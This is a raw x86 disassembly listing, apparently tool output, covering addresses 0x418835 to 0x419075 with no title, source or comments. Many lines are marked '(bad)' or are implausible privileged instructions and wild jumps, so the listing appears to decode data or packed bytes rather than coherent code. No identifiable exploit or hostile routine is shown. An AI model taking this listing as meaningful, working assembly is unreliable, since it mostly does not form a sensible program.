  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
